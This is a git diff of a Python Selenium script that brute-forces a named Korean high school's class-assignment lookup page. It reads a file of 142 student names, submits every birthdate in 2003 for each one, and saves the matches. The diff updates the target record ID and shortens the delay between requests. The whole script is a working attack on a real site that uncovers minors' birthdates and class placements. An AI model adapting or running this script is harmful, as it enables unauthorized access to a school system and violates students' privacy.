@@ -6,10 +6,10 @@ import os
 from bs4 import BeautifulSoup
 
 '''
-반배정을 내놔라 (BBZ)
-만든이 : mtslzx (mtslzx@gmail.com)
-Ver. 0.2 Alpha
-Description : 고등학교 반배정을 브루트포스로 찾아내주는 프로그램입니다.
+반배정을 내놔라 
+제작자 : mtslzx (mtslzx@gmail.com)
+버전 : 0.2 Alpha
+설명 : 고등학교의 반배정 확인 시스템에 생일을 무차별 대입해 찾아내주는 프로그램입니다.
 '''
 # == 코드 시작 ==
 
@@ -28,7 +28,7 @@ name_list = open('이름.txt', 'rt', encoding='utf-8')
 #print(fail)
 list = open('반배정.txt', 'at', encoding='utf-8')
 # 홈페이지에 양식 입력
-for i in range(142):
+for i in range(142):  # 이름의 갯수에 맞추어 주세요.
         name = name_list.read(3)
         print("[시작] 현재 진행중인 이름:", name)
         for month in range(12):
@@ -38,14 +38,14 @@ for i in range(142):
             else:
                 for day in range(31):
                     date = '2003' + str('%02d'% (month+1)) + str('%02d'% (day+1))
-                    driver.get('http://samcheonpo-h.gne.go.kr/samcheonpo-h/ad/selectClClasInqireInfo.do?clasInqireSn=21834')
+                    driver.get('http://samcheonpo-h.gne.go.kr/samcheonpo-h/ad/selectClClasInqireInfo.do?clasInqireSn=22440')
                     driver.find_element_by_xpath('//*[@id="aditCol1"]').send_keys(name)  # 이름부분
                     print('[알림] 이름 입력')
                     driver.find_element_by_xpath('//*[@id="aditCol2"]').send_keys(date)  # 생일
                     print('[알림] 생일 입력')
                     driver.find_element_by_xpath('//*[@id="btn_search"]').click()  # 검색
                     print('[알림] 검색, 잠자기')
-                    time.sleep(0.1 + random.uniform(0.001, 0.3))
+                    time.sleep(0.03 + random.uniform(0.001, 0.2))
                     html = driver.page_source
                     soup = BeautifulSoup(html, 'html.parser')
                     result = str(soup.select('#subContent > div > div:nth-child(7) > div.table_st > table > tbody > tr:nth-child(1) > td'))
